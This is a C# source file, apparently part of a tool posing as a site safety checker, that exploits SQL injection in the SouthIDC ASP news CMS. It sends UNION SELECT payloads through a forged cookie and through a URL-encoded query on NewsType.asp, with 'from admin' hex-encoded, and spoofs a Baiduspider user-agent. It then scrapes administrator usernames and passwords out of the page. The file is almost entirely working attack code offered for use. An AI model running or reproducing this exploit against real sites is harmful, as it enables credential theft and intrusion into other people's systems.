using System;
using System.Collections;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
namespace windowsmanger
{
	internal class southidc
	{
		public string exp(string url)
		{
			string urls = url;
			if (!urls.Contains("http://"))
			{
				urls = "http://" + urls;
			}
			bool loudong = this.isexp(urls);
			if (!loudong)
			{
				return "网站未发现安全隐患";
			}
			string sss = this.isshuju(urls);
			if (!(sss == "网站未发现安全隐患"))
			{
				return sss;
			}
			ljnanfang aa = new ljnanfang();
			string shujujieguo = aa.exp(urls);
			if (shujujieguo == "网站未发现安全隐患")
			{
				return "网站未发现安全隐患";
			}
			return shujujieguo;
		}
		public bool isexp(string url)
		{
			bool result;
			try
			{
				string urls = url;
				string exps = "/shownews.asp";
				if (!urls.Contains("http://"))
				{
					urls = "http://" + urls;
				}
				string sss = new WebClient
				{
					Encoding = Encoding.Default
				}.DownloadString(urls + exps);
				if (sss.Contains("数据库出错"))
				{
					result = true;
				}
				else
				{
					result = false;
				}
			}
			catch
			{
				result = false;
			}
			return result;
		}
		public string isshuju(string url)
		{
			string result;
			try
			{
				string exps = "/shownews.asp";
				string shuju = new WebClient
				{
					Proxy = null,
					Encoding = Encoding.Default,
					Headers = 
					{

						{
							"user-agent",
							"Baiduspider"
						},

						{
							"Cookie",
							"ASPSESSIONIDCACQBSAT=JGGFLMFDNIDGIFLOJHNBMGBK;id=59+union+select+1,username,password,4,5,6,7,8,9,10+from+admin"
						}
					}
				}.DownloadString(url + exps);
				MatchCollection matcha = new Regex("<td.height=.50..*?align=.center..class=..*?.>(?<admin>.*?)</td>\\r(?s).*?</font>次.*?>\\r.*?\\r.*?\\r.*?\\r(?<pass>.*?)</td>", RegexOptions.None).Matches(shuju);
				IEnumerator enumerator = matcha.GetEnumerator();
				try
				{
					if (enumerator.MoveNext())
					{
						Match match = (Match)enumerator.Current;
						string bb = match.Groups["admin"].ToString().Replace(" ", "");
						string cc = match.Groups["pass"].ToString().Replace(" ", "");
						result = bb + "  " + cc;
						return result;
					}
				}
				finally
				{
					IDisposable disposable = enumerator as IDisposable;
					if (disposable != null)
					{
						disposable.Dispose();
					}
				}
				result = "网站未发现安全隐患";
			}
			catch
			{
				result = "网站未发现安全隐患";
			}
			return result;
		}
		public string exp1(string url)
		{
			string result;
			try
			{
				string exps = "/NewsType.asp?SmallClass='%20union%20select%200,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9%20%66%72%6F%6D%20%61%64%6D%69%6E";
				string urls = url;
				if (!urls.Contains("http://"))
				{
					urls = "http://" + urls;
				}
				string shuju = new WebClient
				{
					Headers = 
					{

						{
							"user-agent",
							"Baiduspider"
						}
					},
					Encoding = Encoding.Default
				}.DownloadString(urls + exps).Replace("\r", "").Replace("\n", "");
				int a = shuju.IndexOf("title=");
				int b = shuju.IndexOf("target=");
				string jieguo = shuju.Substring(a + 8, b - a - 11);
				result = jieguo;
			}
			catch
			{
				result = "网站未发现安全隐患";
			}
			return result;
		}
	}
}
